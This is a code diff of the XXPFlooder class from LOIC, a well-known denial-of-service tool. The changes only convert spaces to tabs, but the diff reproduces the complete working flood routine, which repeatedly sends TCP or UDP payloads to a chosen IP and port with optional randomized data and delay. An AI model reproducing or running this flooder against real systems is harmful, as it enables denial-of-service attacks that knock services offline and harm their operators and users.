@@ -8,14 +8,14 @@ namespace LOIC
 	{
 		public bool IsFlooding { get; set; }
 		public int FloodCount { get; set; }
-        public int Failed { get; set; }
+		public int Failed { get; set; }
 		public string IP { get; set; }
 		public int Port { get; set; }
 		public int Protocol { get; set; }
 		public int Delay { get; set; }
 		public bool Resp { get; set; }
 		public string Data { get; set; }
-        private bool random;
+		private bool random;
 
 		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
 		{
@@ -26,8 +26,8 @@ namespace LOIC
 			this.Resp = resp;
 			this.Data = data;
 			this.random = random;
-            this.FloodCount = 0;
-            this.Failed = 0;
+			this.FloodCount = 0;
+			this.Failed = 0;
 		}
 		public void Start()
 		{
@@ -40,13 +40,13 @@ namespace LOIC
 		{
 			try
 			{
-        	        	byte[] buf;
+						byte[] buf;
 				if (random == true)
 				{
 					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, Functions.RandomString()));
 				}
 				else
-		                {
+						{
 					buf = System.Text.Encoding.ASCII.GetBytes(Data);
 				}
 
@@ -56,52 +56,52 @@ namespace LOIC
 					Socket socket = null;
 					if (Protocol == 1)
 					{
-                        try
-                        {
-                            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                            socket.NoDelay = true;
-                            socket.Connect(RHost);
-                            socket.Blocking = Resp;
-                            try
-                            {
-                                while (IsFlooding)
-                                {
-                                    FloodCount++;
-                                    socket.Send(buf);
-                                    if (Delay > 0) System.Threading.Thread.Sleep(Delay);
-                                }
-                            }
-                            catch { } // connection reset
-                        }
-                        catch
-                        { // host unreachable
-                            Failed++;
-                        } 
+						try
+						{
+							socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+							socket.NoDelay = true;
+							socket.Connect(RHost);
+							socket.Blocking = Resp;
+							try
+							{
+								while (IsFlooding)
+								{
+									FloodCount++;
+									socket.Send(buf);
+									if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+								}
+							}
+							catch { } // connection reset
+						}
+						catch
+						{ // host unreachable
+							Failed++;
+						}
 					}
 					if (Protocol == 2)
 					{
-                        socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-                        socket.Blocking = Resp;
-                        try
-                        {
-                            while (IsFlooding)
-                            {
-                                FloodCount++;
-                                socket.SendTo(buf, SocketFlags.None, RHost);
-                                if (Delay > 0) System.Threading.Thread.Sleep(Delay);
-                            }
-                        }
-                        catch 
-                        {
-                            Failed++;
-                        }
+						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+						socket.Blocking = Resp;
+						try
+						{
+							while (IsFlooding)
+							{
+								FloodCount++;
+								socket.SendTo(buf, SocketFlags.None, RHost);
+								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+							}
+						}
+						catch
+						{
+							Failed++;
+						}
 					}
 				}
 			}
 			catch
-            {
-                IsFlooding = false;
-            }
+			{
+				IsFlooding = false;
+			}
 		}
 	}
 }
